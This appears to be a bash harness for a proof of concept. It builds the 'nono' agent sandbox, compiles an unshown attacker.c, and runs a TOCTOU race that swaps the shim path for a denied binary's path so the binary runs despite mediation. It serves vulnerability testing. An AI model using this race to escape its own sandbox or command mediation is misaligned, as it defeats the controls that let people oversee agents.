#!/usr/bin/env bash
# run_test.sh — build nono, compile attacker.c, run the AllowShim TOCTOU experiment.
#
# Outputs "BYPASS CONFIRMED" if the real binary ran at least once despite being
# in the mediation deny set, "BYPASS NOT DEMONSTRATED" otherwise.
set -euo pipefail

WORKSPACE=/workspace
POC_DIR="$WORKSPACE/poc"
BIN_DIR=/tmp/nono-poc-bin   # temp build location; attacker is later copied into BINDIR

echo "=== Building nono binaries ==="
cd "$WORKSPACE"
cargo build --release -p nono-cli -p nono-shim --bin nono --bin nono-shim 2>&1 | {
    grep -E "^(Compiling|Finished|error)" || true
} | tail -5

NONO="$WORKSPACE/target/release/nono"
SHIM="$WORKSPACE/target/release/nono-shim"

[ -x "$NONO" ] || { echo "ERROR: nono binary not found"; exit 1; }
[ -x "$SHIM" ] || { echo "ERROR: nono-shim binary not found"; exit 1; }
echo "nono:      $NONO"
echo "nono-shim: $SHIM"

echo ""
echo "=== Building attacker.c ==="
mkdir -p "$BIN_DIR"
gcc -O2 -pthread -o "$BIN_DIR/attacker" "$POC_DIR/attacker.c"
echo "attacker (built): $BIN_DIR/attacker"

echo ""
echo "=== Setting up test environment ==="

# Separate HOME (where ~/.nono state lands) from the paths granted to the
# sandboxed agent in the profile.  nono refuses to grant any path that
# contains its own state root (~/.nono), so HOME must not be a prefix of
# anything in filesystem.allow.
#
#   HOME   = /poc-home          -> state root /poc-home/.nono (NOT in profile)
#   BINDIR = /poc-agent-bin     -> in profile (does NOT contain /poc-home)
#   WORK   = /poc-work          -> in profile (does NOT contain /poc-home)
rm -rf /poc-home /poc-agent-bin /poc-work
HOME_DIR=/poc-home
WORKDIR=/poc-work
BINDIR=/poc-agent-bin
mkdir -p "$HOME_DIR" "$BINDIR" "$WORKDIR"

# Copy attacker into BINDIR so Landlock (which allows BINDIR) permits exec.
cp "$BIN_DIR/attacker" "$BINDIR/attacker"
chmod +x "$BINDIR/attacker"
echo "attacker (final): $BINDIR/attacker"

# testbin: the real binary we want to protect (prints REAL_BINARY_RAN)
TESTBIN="$BINDIR/testbin"
cat > "$TESTBIN" <<'EOF'
#!/bin/sh
echo REAL_BINARY_RAN
EOF
chmod +x "$TESTBIN"
TESTBIN_CANONICAL=$(realpath "$TESTBIN")

# nono mediation profile
PROFILE="$HOME_DIR/profile.json"
TESTBIN_JSON=$(printf '%s' "$TESTBIN_CANONICAL" | sed 's/\\/\\\\/g')
BINDIR_JSON=$(printf '%s' "$BINDIR" | sed 's/\\/\\\\/g')
WORKDIR_JSON=$(printf '%s' "$WORKDIR" | sed 's/\\/\\\\/g')

cat > "$PROFILE" <<PROFILE_EOF
{
  "meta": { "name": "toctou-test", "version": "1.0" },
  "filesystem": {
    "allow": ["$BINDIR_JSON", "$WORKDIR_JSON", "/usr", "/bin", "/lib", "/lib64", "/etc", "/proc"]
  },
  "network": { "block": false },
  "workdir": { "access": "readwrite" },
  "mediation": {
    "commands": [
      {
        "name": "testbin",
        "binary_path": "$TESTBIN_JSON",
        "intercept": [
          {
            "args_prefix": [],
            "action": {
              "type": "respond",
              "stdout": "MEDIATED_RESPONSE\n",
              "exit_code": 0
            }
          }
        ]
      }
    ]
  }
}
PROFILE_EOF

echo "testbin:   $TESTBIN_CANONICAL"
echo "profile:   $PROFILE"
echo "home:      $HOME_DIR"

echo ""
echo "=== Baseline checks ==="

# Baseline 1: PATH-based invocation should produce MEDIATED_RESPONSE (shim works)
echo -n "PATH-based invocation (expect MEDIATED_RESPONSE): "
RESULT=$(HOME="$HOME_DIR" "$NONO" run --silent --allow-cwd \
    --profile "$PROFILE" --workdir "$WORKDIR" -- \
    sh -c "testbin" 2>/dev/null || true)
if echo "$RESULT" | grep -q "MEDIATED_RESPONSE"; then
    echo "OK"
else
    echo "UNEXPECTED: $RESULT"
    echo "WARNING: baseline mediation not working, environment may be broken"
fi

# Baseline 2: direct path invocation without race should be DENIED
echo -n "Direct path (no race, expect DENIED):              "
RESULT=$(HOME="$HOME_DIR" "$NONO" run --silent --allow-cwd \
    --profile "$PROFILE" --workdir "$WORKDIR" -- \
    sh -c "$TESTBIN_CANONICAL" 2>/dev/null; echo "exit=$?")
if echo "$RESULT" | grep -q "REAL_BINARY_RAN"; then
    echo "FAIL — filter not working at all!"
    exit 1
else
    echo "OK (filter is active)"
fi

echo ""
echo "=== TOCTOU race experiment ==="
echo "Strategy: attacker forks children; each child spawns a swap thread that"
echo "alternates g_buf between the shim path and the real binary path."
echo "Supervisor reads shim path -> CONTINUE (no double-read in AllowShim)."
echo "Kernel re-reads -> may see real binary path -> bypass."
echo ""

# We run the attacker as the agent. It discovers the shim path via 'which testbin'
# inside the session and runs the race.  We wrap it in a shell that:
#   1. finds the shim path
#   2. invokes attacker <shim_path> <direct_path> <attempts>
#   3. captures the combined output
ATTEMPTS=300

RESULT=$(HOME="$HOME_DIR" \
    DIRECT_PATH="$TESTBIN_CANONICAL" \
    ATTACKER="$BINDIR/attacker" \
    ATTEMPTS="$ATTEMPTS" \
    "$NONO" run --silent --allow-cwd \
        --profile "$PROFILE" --workdir "$WORKDIR" -- \
        sh -c '
            SHIM_PATH=$(which testbin 2>/dev/null)
            if [ -z "$SHIM_PATH" ]; then
                echo "ERROR: could not find shim via PATH" >&2
                exit 1
            fi
            echo "shim_path:   $SHIM_PATH" >&2
            echo "direct_path: $DIRECT_PATH" >&2
            echo "attempts:    $ATTEMPTS" >&2
            "$ATTACKER" "$SHIM_PATH" "$DIRECT_PATH" "$ATTEMPTS"
        ' 2>&1 || true)

echo "$RESULT"

echo ""
if echo "$RESULT" | grep -q "BYPASS — real binary ran"; then
    echo "=============================================="
    echo "  BYPASS CONFIRMED — AllowShim TOCTOU is real"
    echo "=============================================="
    BYPASS_COUNT=$(echo "$RESULT" | grep -c "BYPASS —" || true)
    echo "  $BYPASS_COUNT successful bypass(es) in $ATTEMPTS attempts"
    exit 0
else
    # Check if real binary output appeared anywhere
    if echo "$RESULT" | grep -q "REAL_BINARY_RAN"; then
        echo "=============================================="
        echo "  BYPASS CONFIRMED (via output string)"
        echo "=============================================="
        exit 0
    else
        echo "=============================================="
        echo "  BYPASS NOT DEMONSTRATED in $ATTEMPTS attempts"
        echo "  (race may need tuning or more attempts)"
        echo "=============================================="
        exit 1
    fi
fi
